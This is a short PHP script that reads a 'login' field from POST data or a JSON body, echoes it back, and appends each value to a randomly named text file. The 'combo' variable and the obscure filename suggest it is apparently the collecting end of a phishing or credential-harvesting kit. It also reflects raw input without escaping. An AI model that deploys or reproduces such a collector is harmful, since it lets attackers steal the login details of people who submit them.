<?php
$combo = $_POST['login'];
echo($combo);
$myfile = fopen("73127dwaidagb12231.txt", "a") or die("Unable to open file!");
if ($combo){
fwrite($myfile, $combo);
fwrite($myfile,"\n");
}
// Takes raw data from the request
$json = json_decode(file_get_contents('php://input'), true);
print($json['login']);
// Converts it into a PHP object
if($json['login']){
 fwrite($myfile, $json['login']);
 fwrite($myfile,"\n");
}else{
 print_r($json);
}
?>
